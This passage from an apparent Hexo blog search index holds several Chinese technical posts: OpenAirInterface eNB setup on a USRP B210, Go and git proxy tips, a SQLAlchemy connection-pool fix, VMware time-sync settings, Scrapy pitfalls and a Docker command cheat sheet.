class=\"keyword\">float</span> f)</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">double</span> <span class=\"title\">int</span><span class=\"params\">(<span class=\"keyword\">double</span> d)</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">long</span> <span class=\"title\">round</span><span class=\"params\">(<span class=\"keyword\">double</span> d)</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">round</span><span class=\"params\">(<span class=\"keyword\">float</span> f)</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">double</span> <span class=\"title\">exp</span><span class=\"params\">(<span class=\"keyword\">double</span> d)</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">double</span> <span class=\"title\">log</span><span class=\"params\">(<span class=\"keyword\">double</span> d)</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">double</span> <span class=\"title\">pow</span><span class=\"params\">(<span class=\"keyword\">double</span> base, <span class=\"keyword\">double</span> exponent)</span></span></span><br><span class=\"line\"><span class=\"function\">Double E, PI</span></span><br></pre></td></tr></table></figure>\n","categories":[],"tags":["java"]},{"title":"OAI搭建eNB","url":"http://b1ng0.top/2019/12/12/oai搭建enb/","content":"<h2 id=\"0x00-前言\"><a href=\"#0x00-前言\" class=\"headerlink\" title=\"0x00 前言\"></a>0x00 前言</h2><p>难以置信，又开始搞5g了。。。</p>\n<h2 id=\"0x01-准备\"><a href=\"#0x01-准备\" class=\"headerlink\" title=\"0x01 准备\"></a>0x01 准备</h2><p>参考链接： <a href=\"https://blog.csdn.net/qq_42030961/article/details/82740296\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/qq_42030961/article/details/82740296</a> </p>\n<p>安装环境：</p>\n<p> Ubuntu 14.04.3 </p>\n<p> USRP B210 </p>\n<h2 id=\"0x02-安装步骤\"><a href=\"#0x02-安装步骤\" class=\"headerlink\" title=\"0x02 安装步骤\"></a>0x02 安装步骤</h2><h3 id=\"更换内核\"><a href=\"#更换内核\" class=\"headerlink\" title=\"更换内核\"></a>更换内核</h3><p>执行如下两条，更换3.19.0-61低延迟内核</p>\n<blockquote>\n<p>sudo apt-get update<br>sudo apt-get install linux-image-3.19.0-61-lowlatency linux-headers-3.19.0-61-lowlatency</p>\n</blockquote>\n<p>更换完成后输入</p>\n<blockquote>\n<p>sudo reboot</p>\n</blockquote>\n<p>电脑就会立刻重启了。重启后输入 uname -a可以查看内核信息。如下</p>\n<blockquote>\n<p>Linux hostname 3.19.0-61-lowlatency #69~14.04.1-Ubuntu SMP PREEMPT Thu Jun 9 10:15:00 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux</p>\n</blockquote>\n<h3 id=\"电源管理\"><a href=\"#电源管理\" class=\"headerlink\" title=\"电源管理\"></a>电源管理</h3><blockquote>\n<p>sudo gedit /etc/default/grub</p>\n</blockquote>\n<p>在GRUB_CMDLINE_LINUX_DEFAULT=”quiet splash”这行的下面添加两行：</p>\n<blockquote>\n<p>GRUB_CMDLINE_LINUX_DEFAULT=”quiet intel_pstate=disable”<br>GRUB_CMDLINE_LINUX_DEFAULT=”processor.max_cstate=1 intel_idle.max_cstate=0 idle=poll”</p>\n</blockquote>\n<p>预告：如果没有关掉c-state，这两行会需要修改，先往下走。</p>\n<blockquote>\n<p>sudo gedit /etc/modprobe.d/blacklist.conf</p>\n</blockquote>\n<p>在文件最后添加</p>\n<blockquote>\n<p>blacklist intel_powerclam</p>\n</blockquote>\n<p>依次执行</p>\n<blockquote>\n<p>sudo apt-get install cpufrequtils<br>sudo gedit /etc/default/cpufrequtils</p>\n</blockquote>\n<p>这个cpufrequtils 大概率为空文件，在里面加上一句：</p>\n<blockquote>\n<p>GOVERNOR=“performance”</p>\n</blockquote>\n<blockquote>\n<p>sudo update-rc.d ondemand disable</p>\n</blockquote>\n<blockquote>\n<p>sudo apt-get install i7z</p>\n</blockquote>\n<p>安装i7z，后面可以查看CPU频率。</p>\n<p>重启，进入bios关闭与节能或者影响CPU次能性能的设置，一般在Advanced设置里面。关闭超线程（Hyper-threading），C-state（有的电脑在bios里面找不到c-state，比如我的就没有，没有需要强行在grub里关），方法见（8）：</p>\n<p>用i7z查看是否完成操作</p>\n<p>sudo i7z<br>看到所有频率都在C0就大工告成了，如果没有，请执行:</p>\n<blockquote>\n<p>sudo gedit /etc/default/grub</p>\n</blockquote>\n<p>注释掉原来的三行（有两行是在（1）中添加的）</p>\n<blockquote>\n<p>GRUB_CMDLINE_LINUX_DEFAULT=”quiet splash”<br>GRUB_CMDLINE_LINUX_DEFAULT=”quiet intel_pstate=disable”<br>GRUB_CMDLINE_LINUX_DEFAULT=”processor.max_cstate=1 intel_idle.max_cstate=0 idle=poll”</p>\n</blockquote>\n<p>把它们都写到一行去，用空格隔开：</p>\n<blockquote>\n<p>GRUB_CMDLINE_LINUX_DEFAULT=”quiet splash quiet intel_pstate=disable processor.max_cstate=1 intel_idle.max_cstate=0 idle=poll”</p>\n</blockquote>\n<p>然后更新并重启即可。</p>\n<blockquote>\n<p>sudo update-grub<br>sudo reboot</p>\n</blockquote>\n<h3 id=\"安装配置\"><a href=\"#安装配置\" class=\"headerlink\" title=\"安装配置\"></a>安装配置</h3><p>克隆源码</p>\n<blockquote>\n<p>sudo apt-get install git<br>git clone <a href=\"https://gitlab.eurecom.fr/oai/openairinterface5g.git\" target=\"_blank\" rel=\"noopener\">https://gitlab.eurecom.fr/oai/openairinterface5g.git</a></p>\n</blockquote>\n<p>如果外网访问速度太差，见0x03.</p>\n<p>配置eNB</p>\n<blockquote>\n<p>sudo gedit ~/openairinterface5g/targets/PROJECTS/GENERIC-LTE-EPC/CONF/enb.band7.tm1.usrpb210.conf</p>\n</blockquote>\n<p>需要更改和确认的部分如下：前三行在MME中可以查到，之后就是把IP对应换成自己的EPC和eNB所在IP。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tracking_area_code  =  \"1\";</span><br><span class=\"line\">mobile_country_code =  \"208\";</span><br><span class=\"line\">mobile_network_code =  \"92\";</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">////////// MME parameters:</span><br><span class=\"line\">    mme_ip_address      = ( &#123; ipv4       = \"192.168.12.62\";</span><br><span class=\"line\">                              ipv6       = \"192:168:30::17\";</span><br><span class=\"line\">                              active     = \"yes\";</span><br><span class=\"line\">                              preference = \"ipv4\";</span><br><span class=\"line\">                            &#125;</span><br><span class=\"line\">                          );</span><br><span class=\"line\">    NETWORK_INTERFACES :</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        ENB_INTERFACE_NAME_FOR_S1_MME         = \"eth0\";</span><br><span class=\"line\">        ENB_IPV4_ADDRESS_FOR_S1_MME           = \"192.168.12.82/24\";</span><br><span class=\"line\">        ENB_INTERFACE_NAME_FOR_S1U            = \"eth0\";</span><br><span class=\"line\">        ENB_IPV4_ADDRESS_FOR_S1U              = \"192.168.12.82/24\";</span><br><span class=\"line\">        ENB_PORT_FOR_S1U                      = 2152; # Spec 2152</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>编译eNB</p>\n<blockquote>\n<p>cd openairinterface5g<br>source oaienv<br>cd cmake_targets<br>sudo ./build_oai -I -w USRP</p>\n</blockquote>\n<p>编译后无红色报错即可</p>\n<p>运行eNB</p>\n<blockquote>\n<p>cd ~/openairinterface5g<br>source oaienv<br>cd cmake_targets<br>./build_oai –eNB -c -w USRP (这条运行一次就行了 确认安装)<br>cd lte_build_oai/build<br>sudo -E ./lte-softmodem -O $OPENAIR_DIR/targets/PROJECTS/GENERIC-LTE-EPC/CONF/enb.band7.tm1.usrpb210.conf -d</p>\n</blockquote>\n<h2 id=\"0x03-网络优化\"><a href=\"#0x03-网络优化\" class=\"headerlink\" title=\"0x03 网络优化\"></a>0x03 网络优化</h2><p>建议安装上ubuntu之后就不要进行更换镜像源操作，然后全局走能连上外网的代理，并且在network处设置proxy，这样就能一劳永逸的解决后续下载速度问题:</p>\n<blockquote>\n<p> http_proxy=’<a href=\"http://ip:port’\" target=\"_blank\" rel=\"noopener\">http://ip:port’</a> </p>\n<p> https_proxy=’<a href=\"http://ip:port’\" target=\"_blank\" rel=\"noopener\">http://ip:port’</a></p>\n<p> socks_proxy=’socks://ip:port’  </p>\n</blockquote>\n","categories":[],"tags":["5g"]},{"title":"go get速度优化","url":"http://b1ng0.top/2019/11/19/go get速度优化/","content":"<h2 id=\"go-get-速度慢\"><a href=\"#go-get-速度慢\" class=\"headerlink\" title=\"go get 速度慢\"></a>go get 速度慢</h2><p> go get -u github.com/gpmgo/gopm </p>\n<p>将 go get 替换成gopm get -g</p>\n<p>对于下载失败的 直接通过github clone</p>\n<p>eg:</p>\n<p>mkdir -p $GOPATH/src/golang.org/x</p>\n<p>cd $GOPATH/src/golang.org/x</p>\n<p>git clone <a href=\"https://github.com/golang/sys.git\" target=\"_blank\" rel=\"noopener\">https://github.com/golang/sys.git</a></p>\n<h2 id=\"git-clone-速度慢\"><a href=\"#git-clone-速度慢\" class=\"headerlink\" title=\"git clone 速度慢\"></a>git clone 速度慢</h2><p>设置全局socks5代理</p>\n<p> git config –global http.proxy socks5://your-server:your-port </p>\n<p>取消设置</p>\n<p> git config –global –unset http.proxy </p>\n<h2 id=\"使用socks代理\"><a href=\"#使用socks代理\" class=\"headerlink\" title=\"使用socks代理\"></a>使用socks代理</h2><p>apt install tsocks<br>vim /etc/tsocks.conf</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">local = 192.168.1.0/255.255.255.0  #local表示本地的网络，也就是不使用socks代理的网络</span><br><span class=\"line\">local = 127.0.0.0/255.0.0.0</span><br><span class=\"line\">server = 127.0.0.1   #socks服务器的IP</span><br><span class=\"line\">server_type = 5  #socks服务版本</span><br><span class=\"line\">server_port = 1080  ＃socks服务使用的端口</span><br></pre></td></tr></table></figure>\n<p>使用代理：</p>\n<p>tsocks apt-get install XXX</p>\n<p>tsocks wget XXX</p>\n","categories":[],"tags":["go"]},{"title":"sqlalchemy并发连接问题","url":"http://b1ng0.top/2019/10/12/sqlalchemy并发连接问题/","content":"<h1 id=\"0x01-问题描述\"><a href=\"#0x01-问题描述\" class=\"headerlink\" title=\"0x01 问题描述\"></a>0x01 问题描述</h1><p>最近在写一个批量扫描工具，使用多线程爬取目标然后将数据存入数据库中，但是在使用sqlalchemy 引擎时线程数过多就会出现错误：“Too many connections”</p>\n<p><img src=\"/images/1570865257995.png\" alt=\"1570865257995\"></p>\n<h1 id=\"0x02-解决方案\"><a href=\"#0x02-解决方案\" class=\"headerlink\" title=\"0x02 解决方案\"></a>0x02 解决方案</h1><ul>\n<li><p>增加数据库最大连接（不可取）</p>\n<p>查了一下数据库最大连接数，当超过最大连接数数据库就会报出去错误，所以适当改大可以勉强解决问题。</p>\n<p><img src=\"/images/1570865477424.png\" alt=\"1570865477424\"></p>\n</li>\n</ul>\n<ul>\n<li><p>不使用连接池</p>\n<p>sqlalchemy在 <code>create_engine</code> 时有很多可选参数，比如：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">engine = create_engine(<span class=\"string\">'mysql://user:password@localhost:3306/test?charset=utf8mb4'</span>,</span><br><span class=\"line\">                       echo=<span class=\"literal\">False</span>, <span class=\"comment\"># 打印info</span></span><br><span class=\"line\">                       pool_size=<span class=\"number\">100</span>, <span class=\"comment\"># 连接池大小 默认为5</span></span><br><span class=\"line\">                       pool_recycle=<span class=\"number\">3600</span>, <span class=\"comment\"># 连接回收时间</span></span><br><span class=\"line\">                       )</span><br></pre></td></tr></table></figure>\n<p>默认不指定连接池设置的话 ，SQLAlchemy会使用一个 QueuePool 绑定在新创建的引擎上，并附上合适的连接池参数。并发连接超过超过最大连接数，就会产生“Too many connections”错误，所以参考sqlalchemy文档完全可以不使用连接池即可解决问题。</p>\n<p>一个栗子:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> sqlalchemy.pool <span class=\"keyword\">import</span> NullPool</span><br><span class=\"line\">engine = create_engine(<span class=\"string\">\"mysql://root:pass@hostname/dbname\"</span>, poolclass=NullPool)</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n","categories":[],"tags":["python"]},{"title":"vmware彻底关闭时间同步","url":"http://b1ng0.top/2019/08/27/vmware彻底关闭时间同步/","content":"<h1 id=\"0x01-问题\"><a href=\"#0x01-问题\" class=\"headerlink\" title=\"0x01 问题\"></a>0x01 问题</h1><p>迫于某垃圾项目需要在一个2014年的win7虚拟机中进行开发，宿主机时间不在2014年虚拟机里面的软件即会崩溃，但是调到2014年宿主机就不能上网了，作为一个复制粘贴boy，实在不能忍受断网调代码，然而在vmware上直接关闭时间同步，虚拟机依然会不时的与宿主机同步时间，于是在虚拟机崩了无数次之后，终于找到了解决方法。。。</p>\n<h1 id=\"0x02-解决方法\"><a href=\"#0x02-解决方法\" class=\"headerlink\" title=\"0x02 解决方法\"></a>0x02 解决方法</h1><ol>\n<li><p>在虚拟机的 .vmx 文件中添加配置选项:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tools.syncTime = &quot;FALSE&quot;</span><br><span class=\"line\">time.synchronize.continue = &quot;FALSE&quot;</span><br><span class=\"line\">time.synchronize.restore = &quot;FALSE&quot;</span><br><span class=\"line\">time.synchronize.resume.disk = &quot;FALSE&quot;</span><br><span class=\"line\">time.synchronize.shrink = &quot;FALSE&quot;</span><br><span class=\"line\">time.synchronize.tools.startup = &quot;FALSE&quot;</span><br><span class=\"line\">time.synchronize.tools.enable = &quot;FALSE&quot;</span><br><span class=\"line\">time.synchronize.resume.host = &quot;FALSE&quot;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>在win7中关闭与Internet时间服务器同步</p>\n<p><img src=\"/images/1566871209850.png\" alt=\"1566871209850\"></p>\n</li>\n</ol>\n<h1 id=\"0x03-参考链接\"><a href=\"#0x03-参考链接\" class=\"headerlink\" title=\"0x03 参考链接\"></a>0x03 参考链接</h1><p><a href=\"https://kb.vmware.com/articleview?docid=1189&amp;lang=zh_CN\" target=\"_blank\" rel=\"noopener\">https://kb.vmware.com/articleview?docid=1189&amp;lang=zh_CN</a></p>\n","categories":[],"tags":["vmware"]},{"title":"scrapy的一些坑","url":"http://b1ng0.top/2019/08/05/scrapy的一些坑/","content":"<h2 id=\"导出数据时中文乱码\"><a href=\"#导出数据时中文乱码\" class=\"headerlink\" title=\"导出数据时中文乱码\"></a>导出数据时中文乱码</h2><p>使用scrapy抓取的数据中含有中文时，因为中文默认是Unicode, 在使用-o参数导出时，无法显示。</p>\n<p>解决方法：在setting.py中添加一行</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">FEED_EXPORT_ENCODING = <span class=\"string\">'utf-8'</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"meta参数的浅拷贝问题\"><a href=\"#meta参数的浅拷贝问题\" class=\"headerlink\" title=\"meta参数的浅拷贝问题\"></a>meta参数的浅拷贝问题</h2><p>多级爬取数据时，需要在多个页面中获取数据，使用meta参数可以在多个parse中传递值，但是由于meta是浅拷贝，当item中的数据需要重复爬取时，下一个函数接收item= response.meta[‘item’]并不会及时更新，所以需要进行深拷贝：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> copy</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">yield</span> scrapy.Request(post_url, callback=self.parse_post_url,</span><br><span class=\"line\">                meta=&#123;<span class=\"string\">'item'</span>:copy.deepcopy(item)&#125;)</span><br></pre></td></tr></table></figure>\n<h2 id=\"参考链接\"><a href=\"#参考链接\" class=\"headerlink\" title=\"参考链接\"></a>参考链接</h2><p><a href=\"https://www.aisun.org/2017/10/python+scrapy/\" target=\"_blank\" rel=\"noopener\">https://www.aisun.org/2017/10/python+scrapy/</a></p>\n<p><a href=\"https://www.zhihu.com/question/54773510/answer/146971644\" target=\"_blank\" rel=\"noopener\">https://www.zhihu.com/question/54773510/answer/146971644</a></p>\n","categories":[],"tags":["爬虫 scrapy"]},{"title":"docker常用命令整理","url":"http://b1ng0.top/2019/07/25/docker常用命令整理/","content":"<blockquote>\n<p>记录一下docker常用的命令，待续…</p>\n</blockquote>\n<h2 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 一键安装(linux)docker CE</span></span><br><span class=\"line\">curl -fsSL get.docker.com -o get-docker.sh</span><br><span class=\"line\">sudo sh get-docker.sh --mirror Aliyun</span><br><span class=\"line\"><span class=\"comment\"># 启动 Docker CE</span></span><br><span class=\"line\">sudo systemctl <span class=\"built_in\">enable</span> docker</span><br><span class=\"line\">sudo systemctl start docker</span><br><span class=\"line\"><span class=\"comment\"># 建立 docker 用户组</span></span><br><span class=\"line\">sudo groupadd docker</span><br><span class=\"line\">sudo usermod -aG docker <span class=\"variable\">$USER</span></span><br><span class=\"line\"><span class=\"comment\"># 测试 Docker 是否安装正确</span></span><br><span class=\"line\">docker run hello-world</span><br><span class=\"line\"><span class=\"comment\"># 镜像加速 写入`/etc/docker/daemon.json`</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"string\">\"registry-mirrors\"</span>: </span><br><span class=\"line\">\t[</span><br><span class=\"line\">\t\t<span class=\"string\">\"https://dockerhub.azk8s.cn\"</span>,</span><br><span class=\"line\">\t\t<span class=\"string\">\"https://reg-mirror.qiniu.com\"</span></span><br><span class=\"line\">\t]</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"使用镜像\"><a href=\"#使用镜像\" class=\"headerlink\" title=\"使用镜像\"></a>使用镜像</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 版本等信息</span></span><br><span class=\"line\">docker version</span><br><span class=\"line\"><span class=\"comment\"># 更多的信息</span></span><br><span class=\"line\">docker info</span><br><span class=\"line\"><span class=\"comment\"># 查看后台运行的容器</span></span><br><span class=\"line\">docker ps        </span><br><span class=\"line\"><span class=\"comment\"># 搜索镜像</span></span><br><span class=\"line\">docker search ubuntu:18.04</span><br><span class=\"line\"><span class=\"comment\"># 下载xxx镜像</span></span><br><span class=\"line\">docker pull ubuntu:18.04</span><br><span class=\"line\"><span class=\"comment\"># 列出镜像</span></span><br><span class=\"line\">docker image ls</span><br><span class=\"line\"><span class=\"comment\"># 中间层镜像</span></span><br><span class=\"line\">docker image ls -a</span><br><span class=\"line\"><span class=\"comment\"># 删除虚悬镜像</span></span><br><span class=\"line\">docker image prune</span><br><span class=\"line\"><span class=\"comment\"># 删除xxx镜像</span></span><br><span class=\"line\">docker image rm ubuntu \t</span><br><span class=\"line\"><span class=\"comment\"># 导出镜像并压缩</span></span><br><span class=\"line\">docker save ubuntu &gt; myubuntu.tar</span><br><span class=\"line\">tar -zcvf myubuntu.tar.gz myubuntu.tar</span><br><span class=\"line\"><span class=\"comment\"># 解压导入镜像</span></span><br><span class=\"line\">tar -xzvf myap.tar.gz</span><br><span class=\"line\">docker load &lt; myap.tar</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># commit保存镜像</span></span><br><span class=\"line\"><span class=\"comment\"># 运行nginx服务</span></span><br><span class=\"line\">docker run --name webserver -d -p 80:80 nginx</span><br><span class=\"line\"><span class=\"comment\"># 对nginx做出修改</span></span><br><span class=\"line\">docker <span class=\"built_in\">exec</span> -it webserver bash</span><br><span class=\"line\">root@3729b97e8226:/<span class=\"comment\"># echo '&lt;h1&gt;Hello, Docker!&lt;/h1&gt;' &gt; /usr/share</span></span><br><span class=\"line\">/nginx/html/index.html</span><br><span class=\"line\">root@3729b97e8226:/<span class=\"comment\"># exit</span></span><br><span class=\"line\">docker diff webserver</span><br><span class=\"line\"><span class=\"comment\"># 保存修改为新镜像</span></span><br><span class=\"line\">docker commit \\</span><br><span class=\"line\">\t--author <span class=\"string\">\"b1ng0\"</span> \\</span><br><span class=\"line\">\t--message <span class=\"string\">\"修改了默认网页\"</span> \\</span><br><span class=\"line\">\twebserver \\</span><br><span class=\"line\">\tnginx:v2</span><br><span class=\"line\"><span class=\"comment\"># 查看镜像历史</span></span><br><span class=\"line\">docker <span class=\"built_in\">history</span> nginx:v2</span><br></pre></td></tr></table></figure>\n<h2 id=\"操作容器\"><a href=\"#操作容器\" class=\"headerlink\" title=\"操作容器\"></a>操作容器</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 新建并启动容器</span></span><br><span class=\"line\">docker run -it ubuntu:18.04 /bin/bash</span><br><span class=\"line\"><span class=\"comment\"># 启动/重启/停止xxxx容器</span></span><br><span class=\"line\">docker container start/restart/stop xxx</span><br><span class=\"line\"><span class=\"comment\"># 删除xxx容器</span></span><br><span class=\"line\">docker container rm xxx</span><br><span class=\"line\"><span class=\"comment\"># 后台运行</span></span><br><span class=\"line\">docker run -d ubuntu</span><br><span class=\"line\"><span class=\"comment\"># 进入后台运行的容器</span></span><br><span class=\"line\">docker <span class=\"built_in\">exec</span> xxx</span><br><span class=\"line\"><span class=\"comment\"># 导出容器</span></span><br><span class=\"line\">docker <span class=\"built_in\">export</span> xxx &gt; ubuntu.tar</span><br><span class=\"line\"><span class=\"comment\"># 导入容器</span></span><br><span class=\"line\">docker import ubuntu.tar <span class=\"built_in\">test</span>/ubuntu:v1.0</span><br><span class=\"line\"><span class=\"comment\"># 清理所有处于终止状态的容器</span></span><br><span class=\"line\">docker container prune</span><br></pre></td></tr></table></figure>\n<h2 id=\"访问仓库\"><a href=\"#访问仓库\" class=\"headerlink\" title=\"访问仓库\"></a>访问仓库</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 注册 https://hub.docker.com</span></span><br><span class=\"line\"><span class=\"comment\"># 登录</span></span><br><span class=\"line\">docker login <span class=\"comment\"># 输入用户名密码</span></span><br><span class=\"line\"><span class=\"comment\"># 退出登录</span></span><br><span class=\"line\">docker <span class=\"built_in\">logout</span> </span><br><span class=\"line\"><span class=\"comment\"># 拉取镜像</span></span><br><span class=\"line\">docker search centos</span><br><span class=\"line\">docker pull centos</span><br><span class=\"line\"><span class=\"comment\"># 推送镜像(登陆状态)</span></span><br><span class=\"line\">docker tag ubuntu:18.04 b1ng0/ubuntu:18.04</span><br><span class=\"line\">docker push b1ng0/ubuntu:18.04</span><br><span class=\"line\">docker search b1ng0</span><br></pre></td></tr></table></figure>\n<h2 id=\"数据管理\"><a href=\"#数据管理\" class=\"headerlink\" title=\"数据管理\"></a>数据管理</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 创建数据卷</span></span><br><span class=\"line\">docker volume create my-vol</span><br><span class=\"line\"><span class=\"comment\"># 查看所有数据卷</span></span><br><span class=\"line\">docker volume ls</span><br><span class=\"line\"><span class=\"comment\"># 查看指定数据卷信息</span></span><br><span class=\"line\">docker volume inspect my-vol</span><br><span class=\"line\"><span class=\"comment\"># 启动一个挂载数据卷的容器 (--mount参数后面不要有空格)</span></span><br><span class=\"line\">docker run -d -P \\</span><br><span class=\"line\">\t--name web \\</span><br><span class=\"line\">\t<span class=\"comment\"># -v my-vol:/webapp \\ </span></span><br><span class=\"line\">\t--mount <span class=\"built_in\">source</span>=my-vol,target=/webapp \\</span><br><span class=\"line\">\ttraining/webapp \\ </span><br><span class=\"line\">\tpython app.py</span><br><span class=\"line\"><span class=\"comment\"># 查看数据卷(在容器中)的具体信息</span></span><br><span class=\"line\">docker inspect web</span><br><span class=\"line\"><span class=\"comment\"># 删除数据卷</span></span><br><span class=\"line\">docker volume rm my-vol</span><br><span class=\"line\"><span class=\"comment\"># 清理无主数据卷</span></span><br><span class=\"line\">docker volume prune</span><br><span class=\"line\"><span class=\"comment\"># 挂载主机目录作为数据卷</span></span><br><span class=\"line\">docker run -d -P \\</span><br><span class=\"line\">\t--name web \\</span><br><span class=\"line\">\t<span class=\"comment\"># -v /src/webapp:/opt/webapp \\</span></span><br><span class=\"line\">\t--mount <span class=\"built_in\">type</span>=<span class=\"built_in\">bind</span>,<span class=\"built_in\">source</span>=/src/webapp,target=/opt/webapp \\</span><br><span class=\"line\">\ttraining/webapp \\</span><br><span class=\"line\">\tpython app.py</span><br><span class=\"line\"><span class=\"comment\"># 